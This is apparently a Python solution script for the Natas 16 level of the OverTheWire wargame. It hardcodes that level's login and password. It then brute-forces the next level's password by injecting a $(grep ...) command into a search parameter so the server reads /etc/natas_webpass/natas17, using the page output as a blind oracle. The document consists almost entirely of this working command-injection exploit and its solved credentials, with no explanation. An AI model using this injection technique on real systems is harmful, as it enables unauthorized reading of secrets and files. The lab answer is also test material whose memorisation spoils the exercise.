import requests
import string

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
passwordLen = len(password)
bruteforce = string.ascii_letters + string.digits
correctPwd = ''
trustStr = 'Output:\n<pre>\n</pre>'

url = 'http://{}:{}@{}.natas.labs.overthewire.org/index.php'.format(username, password, username)

# print('Query: {}'.format(query))
# print('Respond: {}'.format(respond.text))
# print('Content: {}'.format(content))
# print('Bruteforce: {}'.format(bruteforce))
# print('Password Length: {}'.format(passwordLen))

for size in range(passwordLen):

    print("Round {}/{}".format(size, passwordLen))

    for char in bruteforce:
        query = '{}?needle=$(grep ^{} /etc/natas_webpass/natas17)Fridays&submit=Search'.format(url, correctPwd+char)

        respond = requests.get(query)
        content = respond.text.find(trustStr) # Not found return -1

        print("Trying: {} {}".format(char, content))

        if content != -1:
            correctPwd += char
            print('*************** Found: {}'.format(correctPwd))
            break